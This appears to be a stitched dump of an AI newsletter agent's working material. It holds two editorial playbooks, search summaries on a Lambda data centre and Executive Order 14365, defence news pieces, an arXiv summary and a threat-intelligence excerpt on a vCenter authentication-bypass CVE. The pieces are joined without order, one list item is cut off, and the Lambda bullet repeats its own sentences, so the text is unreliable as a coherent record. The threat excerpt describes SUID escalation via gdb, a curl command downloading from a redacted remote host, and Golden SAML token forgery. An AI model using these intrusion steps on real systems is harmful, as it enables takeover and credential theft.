{"stdout":"# Editorial playbook — the Week in Review

You are producing this week's Week in Review for AI Edge Briefing. The daily edition answers "what happened in AI today?". This edition answers "what is actually changing in AI right now?" — and it does that without becoming an opinion piece. The shape is fixed:

1. **What happened** — the developments of the week, held to exactly the daily edition's standard: every claim linked, every number the source's number.
2. **What connects** — developments that appear to be part of the same larger shift, with the relationship stated from the record: shared actors, shared documents, sequence in time, and causes *attributed to whoever asserted them*. Never our own.
3. **What we don't know** — where the evidence ends, where sources disagree, and what would have to happen next to confirm or invalidate the emerging picture.

**Facts → Connections → Uncertainty. Not Facts → Our opinion.** `scripts/validate-week.js` enforces this mechanically and the edition cannot be published until it passes.

## 0. Setup

1. Work in the repo root. `DATE` is `TZ=America/Toronto date +%F`. **It must be a Monday.** If it is not, stop and report — do not write a file.
2. The period is the previous Monday to Sunday: `period.from = DATE − 7`, `period.to = DATE − 1`. Write it down.
3. `ls data/` and read every `data/<d>.json` whose date falls inside the period, plus today's daily if it has landed (its window covers Sunday). Note which days of the period have **no** daily file — the site launched 11 September 2026, so early weeks are incomplete, and those days must be covered by research, not skipped.
4. `node scripts/build.js --topics` — the existing topic slugs, now with a "weekly threads" count. Reuse them; coin a new slug only when nothing fits.
5. Read the previous `data/*.week.json` if one exists. A thread may continue from last week ("last week the Pentagon said X; this week Y"), but the bullets carry only this week's facts.
6. Read `PROMPT.md` §1 (the four beats and the **Sourcing rules**) and §2. They apply here unchanged.
7. `node scripts/build.js --storylines` and read every `storylines/*.json` — you will update them in §3f.

## 0b. Keep your own context small

Read §0b of `PROMPT.md` and follow it here too. The week in review is the most expensive run of the week, and
for the same reason: every turn re-sends the whole conversation, so what you pull in early you pay for all
morning. Write with `Write`, change with `Edit`, never print a file back to check it, read only the part of a
file you need, and let subagents hold the raw material. It costs you nothing editorially — the locks in
`scripts/validate-week.js` are what guarantee the rigour, not the size of your context.

## 1. Research — the dailies are the inventory, not the ceiling

1. From the daily files, list every item with its date, topics and sources. Group items that share topics across days — those groups are your first candidates for threads.
2. Launch the **four beat subagents** from `PROMPT.md` §1 in one message, with the **week** as the window (absolute timestamps), the Sourcing rules verbatim, and this brief: *"Find developments in this window that are NOT in the following list of headlines, and later developments in the stories that are. Return the same block format."* Paste the headline list. 15–30 searches each.
3. Run the gap-check searches from `PROMPT.md` §1 for the week, plus: "AI" + the names of any actor that appears in two or more of your candidate threads.
4. **Re-open the primary source of every development you intend to keep** — even ones lifted from a daily. A daily item is not a source; its sources are. Confirm the headline, every number, every date and every URL again. If `WebFetch` refuses a page, `node scripts/fetch.js <url>`; never archive or cache sites.
5. For every connection you intend to draw, open the document the connection rests on (the statement, the filing, the report) and note what it actually says about the other development — usually nothing, and that is a fact you will state.

## 2. Select

Keep **5–12 developments**, ranked by the daily's significance order: capability change, real-world deployment or harm at scale, binding legal or regulatory effect, security impact, money and compute scale. A story that ran over several days is **one** development whose bullets carry the dates. Drop anything you could not re-open.

## 3. Write `data/DATE.week.json`

```json
{
  "date": "DATE", "kind": "week", "generated_at": "<ISO-8601 UTC>",
  "period": { "from": "YYYY-MM-DD", "to": "YYYY-MM-DD" },
  "summary": ["2–3 paragraphs on the shape of the week — facts and numbers only, ~150–250 words"],
  "happened": [
    { "id": "pentagon-anthropic-exit",
      "headline": "Specific, factual, one line — who did what, with the key number",
      "sources": [{ "name": "DefenseScoop", "url": "https://..." }],
      "bullets": ["The fact with the number, dated.", "What followed later in the week, dated.", "Caveats: what is unverified, what the source did not say."],
      "topics": ["pentagon", "anthropic", "military"],
      "impact": "beneficial" | "harmful" | "mixed" | "neutral",
      "flags": ["company-claim" | "single-source" | "preprint" | "update"],
      "dates": ["2026-09-11"],
      "editions": ["2026-09-12"] }
  ],
  "connects": [
    { "id": "defense-vendor-realignment",
      "title": "One line naming what the developments share",
      "items": ["pentagon-anthropic-exit", "openai-dod-contract"],
      "topics": ["pentagon", "military", "openai"],
      "explanation": ["1–3 paragraphs. See §3b."],
      "sources": [{ "name": "DefenseScoop", "url": "https://..." }] }
  ],
  "unknowns": [
    { "id": "pentagon-transition-completion",
      "question": "One line, phrased as the question a careful reader is left with",
      "topics": ["pentagon", "anthropic"],
      "relates_to": ["defense-vendor-realignment"],
      "evidence_ends": "What no source has said. Which figures rest on one party.",
      "disagreement": "Optional — who says what, both sides attributed.",
      "would_confirm": "A concrete, observable event: a ruling, a filing, a second outlet, a published number.",
      "would_invalidate": "Equally concrete." }
  ],
  "figures": [{ "value": "about 90%", "label": "what it measures", "source": "DefenseScoop", "url": "https://..." }],
  "calendar": [{ "date": "17 Sep", "event": "…", "source": "…", "url": "https://..." }]
}
```

Ids are lowercase-hyphen slugs, unique across the whole file. `happened[].dates` are the days it happened; `editions` the daily editions that carried it (`[]` if none — a gap-check find).

### 3a. What happened

Same rules as `PROMPT.md` §3 for headlines, bullets, sources, topics, impact and flags. Two additions:
- Bullets trace the week: first the fact with the number and its date, then what followed, with dates.
- Re-assess flags. A story that was `single-source` on Tuesday may have a second outlet by Friday; a `company-claim` may have been independently confirmed — or not. Say which.

### 3b. What connects — the rules that keep this factual

A connection joins **two or more** developments (`items`) that share an actor, a document, a market, a regulator, or that occurred in sequence. The explanation may contain only:

1. what each development says (in the words of its sources);
2. the shared element, named plainly — "the same office", "both cite the same rule", "the same 10 September report";
3. the sequence, with dates — "two days apart", "the day after";
4. a cause, motive or consequence **only as an attributed statement**: "DefenseScoop attributes the split to…", "Altman said the pause was in response to…", "the filing says…" — and the source that said it goes in `connects[].sources`.

It may **not** contain: our own causal claims ("A led to B", "because of A, B"), predictions, likelihoods, or numbers that are not in the joined items. When no source links two developments, say so — "no source this week connected the two" — because that is a fact and a useful one.

The validator rejects, in any connection: a sentence with a causal marker (`because`, `led to`, `caused`, `driven by`, `in response to`, `as a result`, `due to`, `prompted`, `triggered`, `therefore`, `consequently`, `explains why`, `to counter`, `retaliat…`) that has no attribution word (`said`, `wrote`, `told`, `according to`, `reported`, `argued`, `stated`, `attributed`, `cited`, `described`, `filing`, `announced`); any number not present in the joined items' headline or bullets; and any opinion marker (see §3d).

Give every connection the topic slugs a reader would follow (`agents`, `china`, `export-controls`, `openai`, `anthropic`, `evals`, `compute`…). They build the "how this story has evolved" timeline on the Trends pages — this is how a reader will follow a storyline across weeks, so tag the storyline, not just the actors.

### 3c. What we don't know

One entry per connection (at least), and one for any major single development that rests on thin evidence. Each must state:
- `evidence_ends` — what no source has said; which figures rest on one party's word;
- `disagreement` (optional) — who says what, both sides attributed;
- `would_confirm` and `would_invalidate` — **concrete, observable events**: a ruling, a filing, a second outlet, a published number, a dated deadline passing. Never "time will tell", never "we'll see".

This is the only place hedged language belongs (`may`, `appears`, `could`) — and only in the question, paired with the test that would settle it.

### 3d. Language

Plain, declarative, attributed. The validator rejects everywhere: the daily's banned list (`I think`, `probably`, `could mean`, `huge`, `game-changer`, `revolutionary`, and the like) plus `we believe / think / expect / suspect`, `in our view`, `our take`, `clearly`, `obviously`, `undoubtedly`, `no doubt`, `it is likely`, `is likely to`, `inevitable`, `it seems`, `seems to`, `appears to be`, `arguably`, `the real story`, `the takeaway`, `bottom line`, `make no mistake`, `could signal`, `may signal`. It warns on `likely`, `suggests that`, `should`, `must`, `could`, `might`, `notably`, `importantly`, `worrying`, `alarming`, `striking`, `remarkable`, `landmark`, `unprecedented`, `historic` — remove them unless they are inside a quotation. Quoted text is exempt from both lists, so quote the source rather than paraphrase a loaded word.

### 3e. Figures and calendar

- `figures`: 5–10 key numbers of the week, exactly as written in the source, with `value`, `label`, `source`, `url`.
- `calendar`: dated events in the next 7 days confirmed by a source — deadlines, hearings, votes, scheduled releases, earnings. Omit if none.

### 3f. Storylines — the running record of each arc

Storylines are the curated arcs (`storylines/<id>.json`) that answer "what is actually changing?": a one-line `frame`, the `question` a future event would settle, dated `states` snapshots of where it stands, tracked `figures`, open `questions`, and a timeline built automatically from the daily items filed under the id. **Nothing is ever deleted** — a storyline goes `dormant` or `resolved` and stays on the history page with its full record. After part 3, for every storyline:

- **Update the state** if anything was filed under it this week (items with `"storylines": [id]` in the period's dailies, or your own connects tagged with it): append `{ "date": DATE, "text": [...], "changed": "one or two sentences on what moved since the previous snapshot" }`. Never edit or remove an earlier snapshot. The text is *where this stands as of DATE*, written under the same rules as part 2: attributed causes only, no opinion, and **no number that is not in an item filed under the storyline or in its figures** (`scripts/validate-storyline.js` enforces this). Add to `figures` any number the arc will be tracked by; add to `questions` any open question from part 3 that belongs to it, and set `settled: {date, text, url}` on a question the week answered.
- **Tag your connects**: each connect that advances an arc carries `"storylines": [id]`.
- **Dormant**: no item filed and no update for four weeks → `"status": "dormant"` (say so in a final `changed`). **Resolved**: the `question` has been settled by a documented event → `"status": "resolved"` and `"resolved": { "date", "text", "url" }`. Resolved storylines can no longer be filed under.
- **Propose at most one new storyline per week**, only if the admission test holds: it could plausibly be settled by a future event, and it has either 3+ developments across 2+ weeks or one development that clears the daily significance bar. **Do not create a file for it.** Put the proposal in your final report only — the id you would use, the name, the frame, and why it clears the admission test. A `storylines/*.json` file is committed to a public repository and written through a published run log, so a proposed storyline written as a file is editorial state anyone can read; the editor creates the file when they decide to promote it. The cap is **12 live** — do not promote past it.
- Validate: `node scripts/validate-storyline.js --check-links` must exit 0. Commit `storylines/` with the week file.

### 3g. The host script — the week in review as Mike reads it

The Monday episode is not voiced by AI. Mike records it himself from a script you write: `data/DATE.week.host.json`.
It is heard, not read, so it is written for the ear; `scripts/validate-host-script.js` enforces the mechanical
part and the example at `docs/examples/2026-09-28.week.host.json` (with its week file beside it) shows the voice.
Read the example before writing. Shape:

```json
{ "date": "DATE", "kind": "week-host", "host": { "name": "Mike Shoss" },
  "blocks": [ { "type": "open", "lines": [ { "text": "…" } ] }, { "type": "happened", "lines": […] },
              { "type": "connects", "lines": […] }, { "type": "unknowns", "lines": […] },
              { "type": "calendar", "lines": […] }, { "type": "close", "lines": [ { "text": "…" } ] } ] }
```

- **One line = one paragraph = one teleprompter screen.** 40–120 words each. First person, plain speech, complete
  sentences. No sentence of two words or fewer except a question. No dashes doing the work of a sentence.
- **open** (3 paragraphs): the date as spoken ("Monday, October 5th"), "this is The AI Edge, the week in review,
  presented by Epilogue", "I'm Mike Shoss"; one paragraph on what this is (the daily is voiced by AI, Mondays it is
  him, same rules: primary source, the source's number, gaps stated); then the week in three sentences.
- **happened** (5–8 paragraphs): the developments grouped by actor or thread, not one per item — who did what,
  reported where, with the figures the week file has and no others. A paragraph opens by saying what it is
  about ("Anthropic's week was a courtroom."), never with a bare label.
- **connects** (3–4 paragraphs): three of the week's connections, in the first person — this is the part that is
  his to say. Every claim still traces to the week file.
- **unknowns**: an opening line, then 3–4 of the week's open questions **verbatim**, each with one sentence of why
  it matters. Never a question the week file does not carry.
- **calendar**: the dated items, one paragraph.
- **close** (1 paragraph): the full review is on the site with a link behind every claim; the daily is back
  tomorrow morning with Maya and Alex; his name; thanks. **No AI-voice line** — this one is a person.
-

{"stdout":"# Editorial playbook — AI Edge Briefing

You are producing today's edition of a daily briefing on frontier AI. The reader uses this as their single place to stay at the edge: the advances, the research, and how AI is being used for good and for harm — cyber, influence ops, military, health, science, policy. It is not a "fun uses of AI" newsletter. It is raw, factual, sourced.

The reader's standard: **every claim links to where it came from, every number is the number in the source, and nothing is written that the sources do not say.** If you cannot source it, it does not go in.

## 0. Setup

1. Work in the repo root. Determine today's date in **America/Toronto**: `TZ=America/Toronto date +%F`. That is the edition date, `DATE`.
2. `ls data/` — the previous edition tells you the cutoff. The coverage window (`WINDOW`) is from the previous edition's `generated_at` to now (if there is no previous edition, the 24 hours before now). Write it down as absolute timestamps in both UTC and ET; you will hand it to the subagents. Read the previous edition so you do not repeat it; a story already covered goes in again **only if there is a new development**, flagged `update`, and the bullets report only the new facts.
3. `node scripts/build.js --topics` — the existing topic slugs. Reuse them; only coin a new slug when nothing fits.
   `node scripts/build.js --storylines` — the open storylines (id, status, name, frame). An item that is a development in one of those arcs is **filed under it** (see §3, `storylines`). The daily never creates a storyline; the Monday Week in Review does.
4. Every day is a daily edition, Mondays included. The week in review is a separate weekly edition with its own playbook (`PROMPT-WEEK.md`) and its own routine — never part of the daily file.

## 0b. Keep your own context small — it is most of what this edition costs

Every turn you take re-sends this whole conversation. So the price of anything you pull into your context
is its size **times the number of turns that come after it** — a page you open early is paid for a hundred
times over. Measured: writing the edition costs about $3; re-reading the conversation while writing it costs
about $20. None of the rules below cost you a source, a check or an item. They stop you paying rent on text
you have already used.

1. **Write files with `Write`, and change them with `Edit`.** Never `cat > file <<'EOF'`, and never a
   `python3 -`/`node -e` script that does find-and-replace on a data file — those put the whole file, or
   whole paragraphs twice over, into the conversation as a command argument. `Edit` sends only the line that
   changes.
2. **Never print a file back out after writing it.** You know what you wrote. To check it, run the
   validator — it prints errors, not contents.
3. **Read the part you need.** `sed -n '40,80p'` over `cat` for anything long, and don't re-read a file
   that has not changed since you read it.
4. **`node scripts/fetch.js` caps its output at 12,000 characters** — the claim, the date and the figures
   are at the top of a page. Add `--full` only when you have looked and what you need is genuinely further
   down. Don't pipe it through `head` as well; the cap is already there.
5. **Let the subagents hold the raw material.** A beat opens fifty pages and hands you back a page of facts;
   that is the whole point of them. When you need a page opened and checked, and a subagent can do it,
   prefer that to opening it yourself.
6. Same rules for the subagents you launch — put a short version of this in every prompt you give them.

None of this licenses checking less. If a fact needs a source opened, open it. Verify everything §2 says to
verify. This is about what you keep afterwards, not what you look at.

## 1. Sweep the sources — four beats in parallel

Read `SOURCES.md`. Then launch **four general-purpose subagents in one message** with the Agent tool, one per beat. Give each: the `WINDOW` as absolute timestamps, its beat's source list from `SOURCES.md`, the **Sourcing rules** below verbatim, and the return format. Tell each to run many searches (15–30) and to open the listed primary sources directly. If the Agent tool is unavailable, work the four beats yourself in turn — do not skip any.

- **Beat A — Frontier models & labs · Compute, chips & infrastructure · Deployment & impact (industry, funding, labor).** SOURCES.md §1, §7, §8.
- **Beat B — Research & papers (incl. safety, alignment, evals).** SOURCES.md §2. arXiv new listings (cs.AI, cs.LG, cs.CL, cs.CR, cs.CV, cs.RO), Hugging Face papers, alphaXiv, Nature/Science, lab research blogs, Epoch, METR, AISI, CAISI, Apollo, Redwood, Alignment Forum. Prefer papers with a notable quantitative result, from major labs/universities, or drawing significant attention. Return arXiv IDs and author institutions.
- **Beat C — Security, misuse & threat intelligence · Military, defense & geopolitics.** SOURCES.md §3, §4. AI-enabled intrusions and malware, fraud and scams, deepfakes, influence operations, surveillance, prompt injection and agent exploits, model theft / illicit distillation, bio/chem misuse reports; procurement, deployment, autonomous weapons, export controls, national strategies.
- **Beat D — Health, science & medicine · Policy, regulation & law.** SOURCES.md §5, §6. Clinical results, FDA/Health Canada/WHO actions, drug discovery, AI for science, biosecurity; legislation, regulation, enforcement, court rulings and filings, government reports, standards — US federal and state, EU, UK, Canada, China, international bodies.

**Subagent return format** — one block per item, then a short list of rejected candidates and why:

```
SECTION: <one of the eight section names>
HEADLINE: <factual, specific, max 18 words, no hype>
PUBLISHED: <date/time and timezone exactly as the source shows it>
SOURCES: one per line — <publisher> | <exact URL> | primary or report   (only URLs actually opened or seen in search results; never constructed)
FACTS: 2–5 bullets, each a verifiable fact from a linked source, numbers/units/baselines exactly as written, naming which source
FLAGS: company-claim | single-source | preprint | update  (any that apply)
```

**Sourcing rules (give to subagents verbatim):**
1. Only include facts that appear in a source you opened (WebFetch) or in the text of a search result. No inference, speculation, predictions or "this could mean". No hype adjectives.
2. Every item links to the specific article, paper or document — never a homepage or index page. Link the primary source whenever one exists (paper, company post, government document, filing, court record) plus independent reporting. Aim for 2+ sources on significant items; if only one outlet has it, flag `single-source`.
3. Confirm the publication date is inside the window. If the date cannot be determined, drop the item. Older stories qualify only if something new happened inside the window, and only the new facts are reported (flag `update`).
4. Attribute claims: "OpenAI says…", "according to The Record…". Company-reported benchmarks, user counts, revenue and capability claims get `company-claim` unless independently verified. Research that is not peer reviewed gets `preprint`.
5. Quote numbers exactly as the source writes them, with units and the comparison baseline. Do not round, convert or compute new figures.
6. If `WebFetch` refuses a page, fetch it directly with `node scripts/fetch.js <url>` — the sites we read have given permission for direct reads, and the fetcher identifies itself. Use only what the returned text actually says; if it comes back as a paywall stub, a login page or nothing usable, fall back to search-result text or another source and say in the bullet where the figures came from. Never use archive or cache sites, and never cite a URL whose content you did not see. Sites that refuse `WebFetch` are listed in SOURCES.md.
7. Skip consumer tips, "fun uses", prompt guides, listicles, opinion pieces without new facts, minor feature updates, unsourced rumours, and small funding rounds unless strategically notable (US$100M+, or a frontier lab / defense / health / security company).
8. When in doubt, leave it out.

After the beats return, run a few **gap-check searches** yourself for anything a beat may have missed (WebSearch: "AI" + Pentagon / drone; "AI" + FDA / hospital; "AI" + scam / deepfake / influence operation; "AI" + export controls / data center power; "AI" + lawsuit / ruling; plus Techmeme and Hacker News front page), restricted to the window.

## 2. Verify and select

Merge the beats' returns. De-duplicate across beats and against previous editions. Then, for each candidate:
- Open the primary source. Confirm the headline and every number/date/name you intend to use. A secondary report of a paper links the paper. A report of a court ruling links the ruling or docket where possible.
- Prefer two independent sources for anything contested, surprising, or about a specific actor (a named threat group, a company's claim about a rival, a casualty figure).
- Drop: opinion pieces without new facts, product marketing with no numbers, speculation, "could" / "may" stories, anything you cannot open, anything older than the window without a new development.
- Spot-verify: open (WebFetch, or `node scripts/fetch.js` if it refuses) the key source for every item you will mention in the summary and for every figure in the summary; confirm date, numbers and URL yourself. Remove anything you cannot confirm.
- Keep: model/system releases with benchmarks or capabilities; papers with a result (state the result); documented misuse and threat-intel reports (name actors, counts, dates); military and government procurement/deployment; clinical and scientific results; regulation, enforcement, court decisions; compute/chip/energy facts with figures; large-scale deployments and measured impacts, good or bad.

## 3. Write the edition — `data/DATE.json`

Schema (see `data/2026-09-11.json` for a full example once it exists):

```json
{
  "date": "YYYY-MM-DD",
  "edition": "daily",
  "generated_at": "<ISO-8601 UTC timestamp>",
  "window": "e.g. 10 Sep 11:00 → 11 Sep 11:00 UTC",
  "title": "The episode's name — 3 to 10 words, a statement: who did what, or what changed. No period, no colon, no figure that is not in the summary. It is read in podcast apps as 'Name [2 Oct 2026]', so it must stand alone.",
  "summary": ["paragraph 1", "paragraph 2"],
  "sections": [
    {
      "name": "<one of the eight section names below>",
      "items": [
        {
          "headline": "Specific, factual, one line — who did what, with the key number",
          "sources": [{ "name": "Anthropic", "url": "https://..." }, { "name": "Reuters", "url": "https://..." }],
          "bullets": ["What was announced/found, with numbers.", "Why it matters / what it changes.", "Caveats, what is unverified, what to watch."],
          "topics": ["anthropic", "threat-intel", "cyber-offense"],
          "storylines": ["ai-enabled-hacking"],
          "impact": "beneficial" | "harmful" | "mixed" | "neutral",
          "flags": ["company-claim" | "single-source" | "preprint" | "update"]
        }
      ]
    }
  ]
}
```

**Section names** (exactly these; omit a section if it has nothing that day):
1. `Frontier models & labs` — releases, capabilities, benchmarks, lab announcements, safety cases, system cards.
2. `Research & papers` — papers with results: new methods, evals, interpretability, alignment, scaling. State the result and the number.
3. `Security, misuse & threat intelligence` — threat-intel reports, documented attacks using AI, influence operations, scams/deepfakes, model vulnerabilities, prompt injection, jailbreaks, agent security.
4. `Military, defense & geopolitics` — procurement, deployment, autonomous weapons, export controls, national strategies, China/US/EU competition.
5. `Health, science & medicine` — clinical results, FDA actions, drug discovery, AI-for-science results, hospital deployments and their measured outcomes.
6. `Policy, regulation & law` — legislation, regulation, enforcement, court rulings, government reports, standards.
7. `Compute, chips & infrastructure` — chips, fabs, datacenters, power, capex figures, funding rounds and deals with numbers.
8. `Deployment & impact` — large-scale rollouts, labor effects, measured societal effects, incidents, the good and the bad in practice.

# Sources

The sweep list for every edition. **Primary** sources (labs, papers, governments, court filings, security vendors' own reports) are always preferred for the link beside a headline; **secondary** sources (press, newsletters, aggregators) are used to discover stories and as corroboration. Wherever a secondary source reports on a primary document, link the primary document too.

Fetch hints: `WebFetch` works on most pages below. RSS/Atom URLs are listed where they exist because they are the most reliable "what changed in the last 24h" signal.

results:
Lambda announced on November 4, 2026, that it plans a data center campus in Lowndes County, Alabama, with an estimated $33.1 billion investment.

- **Project:** The Red Clay Technology Center Campus sits near U.S. 80 and Alabama 21 on a site that Cloverleaf Infrastructure prepared. The proposed Red Clay Technology Center Campus would be built near U.S. 80 and Alabama 21 at a site Cloverleaf Infrastructure has been preparing for development. Lambda is the end user and will build and operate the AI compute, while Cloverleaf is the developer. Cloverleaf Infrastructure is the project developer and prepared the land for construction. Lambda is the end user and will build and operate the AI compute on the campus.
- **Jobs and timing:** The company projects more than 1,000 construction jobs and over 225 full-time jobs, with construction expected to start in the first quarter of 2027 and take up to five years.
- **Power and cooling:** Alabama Power would supply electricity, pending regulatory approval. Lambda says it will cover the full cost of power and grid infrastructure, and the campus will use closed-loop cooling. Sources differ on capacity: Baxtel describes a planned capacity of 1GW with room to reach 1.5GW, while another report cites power capacity of up to 1,500 megawatts.
- **Opposition:** Critics have filed a second lawsuit. During an Oct. 13 meeting, county commissioners voted 3-2 to approve a more than $2.7 billion package of tax breaks, and opponents are asking a judge to invalidate that approval.

results:
The search results point to a single core order, Executive Order 14365, though the sources differ on its scope and status.

- **The order:** It was issued December 11, 2025 as "Ensuring a National Policy Framework for Artificial Intelligence." It aims to weaken state-level AI regulation through DOJ-led litigation, administrative reinterpretation, conditional federal funding, and a federal policy framework that preempts state laws.
- **Mechanics:** The order calls for federal standards that would preempt conflicting state AI rules, creates a federal litigation task force to challenge state AI laws, and conditions access to federal grant funding on states avoiding onerous AI laws. It also directs federal agencies to withhold certain BEAD broadband funding and discretionary grants from states with "onerous" AI laws.
- **Carve-outs:** Proposed preemption would not reach otherwise lawful state AI laws on child safety protections or AI computer and data center infrastructure, aside from generally applicable permitting reforms.
- **Legal effect as of November 4, 2026:** One tracker says EO 14365 does not itself declare any state law preempted, and no general preemption statute was found. State AI laws remain in force until a federal court grants an injunction or a federal statute is enacted. As of the date of one employer-focused post, no FCC proceeding on a preemptive disclosure standard had been initiated.
- **Congress:** The White House has asked Congress to override state AI laws that impose "undue burdens." Bipartisan governors asked Congress on November 22 for national AI rules that leave state laws standing.

**Caveat:** One result (Wiley) describes a September 29, 2026 order, EO 14434, which rebrands "AI" as "Super Intelligence" and does not expressly address preemption of state AI laws. It is a separate order from EO 14365. I did not find a source confirming a "November 2026" executive order on this topic, so that date in your query may refer to the November 2026 congressional and governors' activity rather than a new order.

]]>
The Army plans to work with OpenAI as it moves forward with a new initiative to accelerate the accreditation process for commercial vendors looking to offer their software to the military, according to the service’s chief information officer.

Project Gatekeeper, which was unveiled last month, aims to automate the traditionally burdensome authority to operate (ATO) process, which often stretches on for months, allowing commercial vendors instead to submit code to an Army DevSecOps platform for quick validation.

“What Gatekeeper was all about was taking that same experience that we built on the DSO platform, bring it to a commercialized space and say, hey, we’ll get you that first initial vetting that says you get the green check mark, that you are actively good enough for our networks. Get their code through, and then that kind of alleviates that relationship barrier between industry that doesn’t have a relationship with the government,” Acting CIO of the Army Gabe Chiulli said Friday at the Annual Data Forum, presented by AFCEA International.

“They get the government check, and that code gets moved into an IL5 environment after it gets through all the different checks, and says, ‘hey, you are now capable of essentially selling your product or distributing your product into a secure Army enclave,’” Chiulli added.

He said he’s working with the other military department CIOs to try to establish “reciprocity” so that they don’t have to build their own systems for this type of process.

Vendors with a Defense Department Common Access Card can log in to Gatekeeper to use the system. But, Chiulli noted, officials are working to open it up more widely and allow companies to access it via the Login.gov platform.

At Friday’s conference, DefenseScoop asked the Army CIO about the timeline for integrating AI models into the Gatekeeper initiative.

“I’m going to put it into the next quarter,” Chiulli replied.

“I think what it’ll be is a phased approach of different commercialized models. So remember, this is on the commercial internet. The first phase of this was always meant to be that we were going to work with OpenAI in the first phase because … we’re using something like Login.gov. It helps us do the validation” using tools like OpenAI’s Daybreak, he said.

The Army wants to be cautious about how it releases an AI model vetting process into the DevSecOps pipeline, he noted.

“So, the first phase is working with OpenAI to kind of work through, like, what do we want to check first? Because there’s a lot of good tooling out there that does validation checks on software already, so we don’t want to repeat and just use tokens just for tokens purposes. We want to apply it in the most strategic, smart, intelligent way,” Chiulli said.

OpenAI did not immediately respond to a request for comment Friday.

After the first phase, the Army will likely start opening it up to other open source and commercial model providers, Chiulli said.

He noted that he’ll encourage companies to bring their own API keys.

“When you think about code scanning in an API era in a vulnerability scanner, it’s going to have logs on their code. So we want to make sure that they’re the only ones that can see that … from that perspective. So that is a protective kind of way we’re thinking through this so that, you know, as they bring their own API key they’re paying for that security from their perspective,” Chiulli said.

“We’ll do a call out at some point to … request different ways and different harnesses, if you will, for checking different things,” he added.

input.prompt: Give the title, authors, institutions, abstract, submission date, and key quantitative results.

response.result:
**Title:** Weight-Space Programming Doesn't Need Transformers

**Authors:** Hyunjong Ok and Jaeho Lee

**Institutions:** Not listed in the provided content.

**Submission date:** November 17, 2026 (arXiv:2611.22055, v1, cs.LG; the page is marked as a preprint, work in progress)

**Abstract summary:** The paper asks whether Transformers should still be the default architecture when a large language model (LLM) writes a network's weights by hand instead of training them with gradient descent. The authors give three frontier LLMs minimal guidance, ten labeled examples, and a sandbox, mainly on multiple-choice questions. When allowed to design the architecture, all three compile plain-text facts into a sparse table that a fixed procedure queries. The LLM-designed models can state what each weight means and can find and rewrite a wrong one. From this, the authors propose an associative-memory-based model. Pretrained LLMs remain more accurate.

**Key quantitative results:**
- Up to **54.4%** test accuracy for the LLM-designed models.
- An LLM-designed model beats the most accurate Transformer that the same LLM wrote, while using about **1,800x fewer parameters**.
- The proposed associative-memory model is up to **17x faster on GPUs** than a same-sized Transformer.

Autonomy firm Auterion to launch joint venture with Ukrainian drone maker Skyfall - Breaking Defense









Ukrainian drone manufacturer Skyfall shows its Vampire unmanned system at the Dubai Airshow on Nov. 19, 2025. (Daniel Woolfolk / Breaking Defense)

WASHINGTON — American autonomous software firm Auterion and Ukrainian drone producer Skyfall plan to form a joint venture to “manufacture drones for Ukraine at high volume in a new factory in Germany,” Auterion announced today.

The new venture, called Skyfall X Auterion, “is being established under the auspices of the official ‘Build with Ukraine’ defense cooperation framework,” the announcement said.

According to Auterion, “initial production” by the joint venture will “focus on the Shrike FPV platform” and is expected to later expand to Skyfall interceptors as well as middle- and deep-strike systems. “Every drone combines a Skyfall airframe with Auterion avionics” as well as Auterion’s operating system, the company said.

Auterion and Skyfall previously partnered for drone production for Ukraine, but Auterion said today that a German factory in particular “adds production capacity outside the range of air strikes, while maintaining a knowledge link and short innovation cycle available to Skyfall’s engineers.

“Feedback from units at the front reaches those engineers every week and goes straight into the German line,” the company said.

Auterion, which is based in Munich as well as the US, said the agreement was inked during the German-Ukrainian Economic Forum today, and Reuters reported that the German government would provide funding for the new factory and for drone orders. Citing an industry official, the newswire reported the funding would be in the range of hundreds of millions of euros first to provide drones to Ukraine and then to the German armed forces.

“SkyFall and Auterion have put more than 50,000 drones into the hands of Ukrainian units with advanced terminal guidance and target detection” Lorenz Meier, founder and CEO of Auterion, said in the announcement. “A factory in Germany gives German forces a domestic source for the same drones Ukrainian units rely on every week.”

On Nov. 19, 2026, VMware disclosed CVE-2026-123890, which impacts VMware vCenter Server deployments. vSphere consists of both ESXi (the hypervisor) and vCenter Server. The vCenter server is a centralized platform deployed as a Photon Linux virtual appliance and is used to configure, control, and monitor ESXi host environments. CVE-2026-123890 is an unauthenticated Secure Remote Password (SRP-6a) session key disclosure vulnerability over Distributed Computing Environment/Remote Procedure Calls (DCE/RPC). Successful exploitation results in a remote authentication bypass which creates an authenticated session established as [email redacted]. Using the authenticated administrator session, the attacker can execute arbitrary commands and acquire files, including the data.mdb database, by leveraging the vCenter Server Directory Service (vmdird) RPC interface vmdirdbcp. We strongly recommend that affected organizations immediately apply the security patches provided by Broadcom to remediate the vulnerability.

src="https://storage.googleapis.com/gweb-cloudblog-publish/images/Figure_1_ARMORY_CASTLE_lateral_movement_an.max-1000x1000.png"

To escalate privileges to root on the Linux appliance, ARMORY CASTLE repeated the same escalation technique used on the Remote Support appliance through the enablement of Set User ID (SUID) permissions on the binary /bin/env. ARMORY CASTLE performed this permission modification using the GNU Debugger, gdb. By enabling SUID permissions on the binary /bin/env, any user would be allowed to execute commands as root.

curl -o /tmp/123.rar -k https://<REDACTED>/content/r.js

While CVE-2026-123890 shares some overlap with CVE-2026-59309, primarily the obtaining of the shared session key "K" without knowing the password, there are multiple key differences between them. CVE-2026-59309 is a flaw in the vCenter Server vmdir daemon that allows a remote, unauthenticated attacker with network access to TCP ports 389 or 636 to send crafted LDAP packets with malformed authorization tokens, bypassing authentication to forge administrative sessions and create rogue Single Sign-On (SSO) accounts in the vSphere directory. Whereas CVE-2026-123890 is a flaw in the vmdir DCE/RPC interface that enables unauthenticated Secure Remote Password session key disclosure by exploiting predictable UUIDv1 timestamp generation in the SRP authentication interface, enabling the compromise of the SRP session key without knowing any passwords.


Shortly after the successful execution of BONESAW, ARMORY CASTLE staged and deployed an additional utility /tmp/sss tracked as SAWSNAKE to the Linux appliance. SAWSNAKE is a Golang utility that enables vCenter SAML authentication bypass and session cookie generation, ultimately enabling ARMORY CASTLE to conduct Golden SAML attacks against vCenter following the successful execution of BONESAW. This allows the threat actor to forge authentication tokens, bypass MFA, and impersonate any user. The core functionality of SAWSNAKE is a custom Go-based port of the Python-based vCenter SAML Login Tool from vcenter_saml_login.py. SAWSNAKE provides the ability to extract Identity Provider (IdP) signing keys and trusted certificates from a vCenter data.mdb database, export extracted credentials to PEM files on disk, forge and sign SAML 2.0 assertions for the Administrator account, and authenticate to a target vCenter server to obtain administrative session cookies. 


